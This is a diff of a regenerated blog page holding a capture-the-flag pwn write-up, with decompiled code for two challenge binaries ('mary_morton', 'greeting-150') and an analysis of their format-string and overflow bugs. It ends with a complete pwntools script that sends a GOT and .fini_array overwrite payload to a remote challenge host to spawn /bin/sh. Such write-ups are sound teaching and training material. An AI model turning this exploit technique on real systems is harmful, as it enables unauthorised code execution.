class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">sub_4009FF</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the battle ! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Great Fairy] level pwned &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Select your weapon &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4009DA</span>();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_4008EB</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">sub_400960</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>In the front of <code>main</code>, <code>sub_4009FF</code> is for setting alarm, <code>sub_4009DA</code> is for printing context.</p>
 <p><code>sub_4008EB</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80uLL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x7FuLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>sub_400960</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80uLL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>sub_4008DA</code> (not in the main logic):</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4008DA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/cat ./flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4008DA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/cat ./flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>If you run this, you will see the interface and know what the vulnerabilities are:</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./mary_morton</span><br><span class="line">Welcome to the battle !</span><br><span class="line">[Great Fairy] level pwned</span><br><span class="line">Select your weapon</span><br><span class="line">1. Stack Bufferoverflow Bug</span><br><span class="line">2. Format String Bug</span><br><span class="line">3. Exit the battle</span><br></pre></td></tr></table></figure>
@@ -364,9 +392,9 @@
 <h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file greeting-150</span><br><span class="line">greeting-150: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped</span><br><span class="line">$ checksec greeting-150</span><br><span class="line">[*] &#x27;/mnt/c/Users/David/Desktop/greeting-150&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>Pseudocode:<br><code>main</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please tell me your name... &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">getnline</span>(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t ignore me ;( &quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;Nice to meet you, %s :)\n&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please tell me your name... &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">getnline</span>(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t ignore me ;( &quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;Nice to meet you, %s :)\n&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>getnline</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fgets</span>(s, n, stdin);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> __cdecl <span class="title">getnline</span><span class="params">(<span class="type">char</span> *s, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fgets</span>(s, n, stdin);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>It has a classic format string vulnerability, but cannot be exploited by just writting some number to some place. </p>
 <p>Since it has <code>Canary</code> and enable the <code>NX</code>, we have to use payload to get shell, then we think about hijacking <code>GOT</code> item. Obviously we have to hijack some item as <code>system_plt</code>, and the <code>/bin/sh</code> still needs to input.</p>
 <p>Only one time of input is not enough, we have to control the program flow for more input chances. But we cannot waste this one chance by just leaking <code>ebp</code> or something, so we do not know base address of the stack, right? We cannot overwrite <code>ret addr</code> as <code>main</code> to drop into <code>main</code> loop, but there is another choice: <code>.fini_array</code>.</p>
@@ -385,7 +413,9 @@
 </ol>
 <p>With the limit 1, our former gadgets like <code>fmt_str</code> and <code>fmtstr_payload</code> of <code>pwntools</code> cannot meet the needs, so we have to write a more compact payload (with <code>hn</code> to write every double bytes, instead of <code>hnn</code> to write every byte).</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;greeting-150&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">39474</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;greeting-150&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>] <span class="comment"># 0x8049a54</span></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># 0x8048490</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 0x80485ed</span></span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>] <span class="comment"># 0x80484f0</span></span><br><span class="line">init_addr = elf.sym[<span class="string">&#x27;_init&#x27;</span>] <span class="comment"># 0x8048404</span></span><br><span class="line">fini_addr = elf.sym[<span class="string">&#x27;_fini&#x27;</span>] <span class="comment"># 0x8048780</span></span><br><span class="line">init_array = elf.sym[<span class="string">&#x27;__init_array_start&#x27;</span>] <span class="comment"># 0x804992c</span></span><br><span class="line">fini_array = elf.sym[<span class="string">&#x27;__init_array_end&#x27;</span>] <span class="comment"># 0x8049934</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># &quot;Hello, I&#x27;m nao!\nPlease tell me your name... &quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aa&#x27;</span>+p32(fini_array+<span class="number">2</span>)+p32(strlen_got+<span class="number">2</span>)+p32(strlen_got)+p32(fini_array)</span><br><span class="line">payload += <span class="string">&#x27;%2016c%12$hn%13$hn%31884c%14$hn%96c%15$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+                    
                 </div>
+
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -394,11 +424,11 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/linux/">linux</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pwn/">pwn</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pwn/">pwn</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/linux/">linux</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
@@ -499,29 +529,25 @@
         <div class="page-main-content-bottom border-box">
             
 <footer class="footer border-box">
-    <div class="border-box website-info-box default">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
         
-            <div class="copyright-info info-item default">
-                &copy;&nbsp;<span>2018</span>&nbsp;-&nbsp;2025
-                
-                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
-                
-            </div>
+    </div>
 
-            <div class="theme-info info-item default">
-                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
-            </div>
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
 
+    
+
+    
+        <div class="count-info info-item">
             
-
-            
-        
-
-        <div class="count-item info-item default">
-            
-                <span class="count-box border-box word">
+                <span class="count-item border-box word">
                     <span class="item-type border-box">Total words</span>
-                    <span class="item-value border-box word">137k</span>
+                    <span class="item-value border-box word">137.1k</span>
                 </span>
             
 
@@ -529,7 +555,9 @@
 
             
         </div>
-    </div>
+    
+
+    
 </footer>
 
         </div>
@@ -539,7 +567,10 @@
     
         <div class="post-tools right-toc">
             <div class="post-tools-container border-box">
-    <ul class="tools-list border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
         <!-- PC TOC show toggle -->
         
             <li class="tools-item flex-center toggle-show-toc">
@@ -572,13 +603,17 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-toggle-theme-mode flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
 
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
@@ -661,7 +696,9 @@
 
 
 
-<!-- common -->
+
+
+<!-- common js -->
 
 <script src="/js/utils.js"></script>
 
@@ -678,7 +715,7 @@
 <script src="/js/libs/anime.min.js"></script>
 
 
-<!-- local-search -->
+<!-- local search -->
 
     
 <script src="/js/local-search.js"></script>
@@ -689,6 +726,10 @@
 
 
 <div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
     
         <!-- post-helper -->
         
